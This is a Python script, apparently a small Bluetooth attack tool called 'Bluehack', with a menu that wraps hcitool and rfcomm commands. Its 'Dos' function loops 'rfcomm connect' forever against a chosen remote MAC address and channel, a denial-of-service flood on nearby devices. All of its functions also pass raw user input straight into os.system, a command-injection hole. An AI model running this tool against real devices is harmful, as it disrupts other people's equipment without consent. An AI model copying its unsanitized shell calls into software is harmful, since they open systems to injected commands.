import time
import sys
import os

def banner():
    os.system("clear")
    print(""" --  |   |    |  -- |   |        ---- | /  """)
    print("""|  | |   |    | |   |   |       |     |/   """)
    print("""| -  |   |    | |-- |---|   /\  |     |\   """)
    print("""|  | |   |    | |   |   |  /--\ |     | \  """)
    print(""" --  |__  ----   -- |   | /    \ ---- |  \ """)
def opt(): # options code
   print("Scan        [ 1 ]")
   print("Dos         [ 2 ]")
   print("Listen      [ 3 ]")
   print("Info        [ 4 ]")
   print("bind        [ 5 ]")
   print("")
   print("exit        [ 0 ]")
   opt = input("[ Bluehack ] --> ")
   if opt == "1":
       scan()
   elif opt == "2":
       dos()
   elif opt == "3":
       listen()
   elif opt == "4":
       info()
   elif opt == "5":
       bind()
   else:
       sys.exit()
def scan(): # listen code
    os.system("hcitool scan")
def dos(): # Dos code
    mac = input("remote mac --> ")
    port = input("channel --> ")
    try:
        while True:
            os.system("rfcomm connect {} {}".format(mac , port))
    except Exception:
        pass
def listen():
    mac = input("remote mac --> ")
    port = input("channel --> ")
    os.system("rfcomm listen {} {}".format(mac , port))
def info():
    mac = input("remote mac --> ")
    os.system("rfcomm show {}".format(mac))
def bind():
    mac = input("remote mac --> ")
    port = input("channel --> ")
    os.system("rfcomm bind {} {}".format(mac , port))
time.sleep(0.5)
banner()
while True:
    opt()
